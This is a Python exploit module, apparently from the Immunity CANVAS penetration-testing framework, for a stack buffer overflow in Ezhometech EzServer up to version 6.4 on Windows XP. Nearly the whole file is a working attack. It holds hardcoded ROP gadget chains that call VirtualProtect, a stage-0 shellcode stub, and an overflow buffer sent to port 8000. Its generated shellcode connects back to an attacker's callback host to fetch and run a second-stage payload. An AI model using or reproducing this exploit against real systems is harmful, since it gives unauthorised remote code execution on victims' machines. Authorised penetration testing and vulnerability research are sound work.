#! /usr/bin/env python

"""
Ezhometech EzServer <=6.4 Stack Overflow Vulnerability
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2012
#http://www.immunityinc.com/CANVAS/ for more information
#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if "." not in sys.path:
    sys.path.append(".")

import time
import canvasengine
from exploitutils import *
from tcpexploit import *

NAME                           = "EzServer"
DESCRIPTION                    = "Ezhometech EzServer Stack Overflow Vulnerability"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "Ezhometech"
DOCUMENTATION["Repeatability"] = "One shot"
DOCUMENTATION["OSVDB"]         = "http://osvdb.org/show/osvdb/83065" # According to this, the bug has been fixed but it's still there
DOCUMENTATION['CVSS']          = 7.5

VERSION                        = "1.0"
                                                                                
PROPERTY                       = {}
PROPERTY['TYPE']               = "Exploit"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [["Windows"]]
PROPERTY['VERSION']            = ['XP']                                                                                
CHANGELOG                      = """                                                                                
"""

DOCUMENTATION['Notes']         = """
Ezhometech EzServer Stack Overflow Vulnerability
Tested on EzServer 6.0.028 on Windows XP SP3
Tested on EzServer 6.4.019 on Windows XP SP3
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.setPort(8000)
        self.setHost("")
        
        self.version   = 0
        self.name      = NAME
        self.badstring = ""

    def getargs(self):
        self.port = self.argsDict.get("port", self.port)
        self.version=int(self.argsDict.get('version', self.version))
        
    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]
        
    def createShellcode(self):        
        sc = shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp', {'subespval': 0})
        sc.addAttr('revert_to_self_before_importing_ws2_32', None)
        sc.addAttr('tcpconnect', {'port'      : self.callback.port, 
                                  'ipaddress' : self.callback.ip})
        mosdef_type = self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
        mosdef_id = self.engine.getNewMosdefID(self)
        
        sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
        sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
        sc.addAttr("ExitThread",None)
        sc.vAllocSelf = True
        self.shellcode = sc.get()

        self.log("Shellcode size: %d" % len(self.shellcode))
                    
    def make_version1(self):
        rop = intel_order(0X00401613)   # POP EBP ezserver6.exe
        rop += intel_order(0x00684A3D)  # call esp ezserver6.exe

        rop += intel_order(0x004BDA8B)  # POP ESI ezserver6.exe
        rop += '\xD4\x1A\x80\x7C'       # ptr to VirtualProtect

        rop += intel_order(0x004CF3FE)  # POP EDX ezserver6.exe
        rop += '\x40\x00\x00\x00'       # newProtect

        rop += intel_order(0x004B78ED)  # POP EDI ezserver6.exe
        rop += '\x25\x14\x40\x00'       # ptr to ret

        rop += intel_order(0x004BCBFA)  # POP EBX ezserver6.exe
        rop += '\x01\x02\x00\x00'       # size

        rop += intel_order(0x007104D5)  # POP ECX ezserver6.exe
        rop += '\x10\x60\x10\x10'       # writable address

        rop += intel_order(0x00469819)  # POP EAX ezserver6.exe
        rop += '\x90\x90\x90\x90'

        eip = intel_order(0x00401613)
        
        jmp_esp = intel_order(0x0044A44D) 

        return (eip,rop,jmp_esp)
    
    def make_version2(self):       
        rop = '\xD8\x95\x40\x00'        # POP EBP js32.dll
        rop += '\x2D\x9C\x67\x00'       # call esp

        rop += '\xCB\x4F\x4B\x00'       # POP ESI ezserver6.exe
        rop += '\xD4\x1A\x80\x7C'       # ptr to VirtualProtect ezserver6.exe

        rop += '\xFA\x5A\x4B\x00'       # POP EDX ezserver6.exe
        rop += '\x40\x00\x00\x00'       # newProtect

        rop += '\x37\x3A\x4B\x00'       # POP EDI ezserver6.exe
        rop += '\x25\x14\x40\x00'       # ptr to ret

        rop += '\x37\x4C\x4D\x00'       # POP EBX ezserver6.exe
        rop += '\x01\x02\x00\x00'       # size

        rop += '\x19\x56\x70\x00'       # POP ECX ezserver6.exe
        rop += '\x10\x60\x10\x10'       # writable address

        rop += '\xFF\xD6\x48\x00'       # POP EAX ezserver6.exe
        rop += '\x90\x90\x90\x90'

        eip = '\xD8\x95\x40\x00'        # EIP POP EBP;
        jmp_esp = '\xD8\xDD\x48\x00'    # JMP ESP

        return (eip,rop,jmp_esp)    

    def run(self):        
        self.getargs()
        self.host = self.target.interface
        
        # This shellcode calls VirtualProtect to the real payload and jumps. 
        stage0 = '\x8B\xDC'                     # MOV EBX,ESP
        stage0 += '\x81\xEB\xB8\x0B\x00\x00'    # SUB EBX, 3284
        stage0 += '\x6A\x40'                    # PUSH 40
        stage0 += '\x68\x00\x10\x00\x00'        # PUSH 4096
        stage0 += '\x53'                        # PUSH EBX
        stage0 += '\xFF\xD6'                    # CALL ESI
        stage0 += '\xFF\xE3'                    # JMP EBX
        
        if self.version == 0:
            eip,rop,jmp_esp = self.make_version1()
        else:
            eip,rop,jmp_esp = self.make_version2()
            
        buffer = 'A'*152          
        buffer += '\x90'*2920
        buffer += self.shellcode
        buffer += 'B'*(5900-len(buffer))
        buffer += eip                       # EIP POP EBP;
        buffer += '\x10\x60\x10\x10'        # RW Address from js32.dll data segment
        buffer += rop
        buffer += jmp_esp                   # JMP ESP
        buffer += stage0  

        s = self.gettcpsock()
        
        try:
            s.connect((self.host,self.port))
            s.send(buffer)
        except Exception, ex:
            self.log('Error: %s' % ex)
        finally:
            s.close()

        for _ in xrange(0, 10):
            if self.ISucceeded(): return 1
            time.sleep(1)

        return 0


if __name__ == '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret = standard_callback_commandline(app)

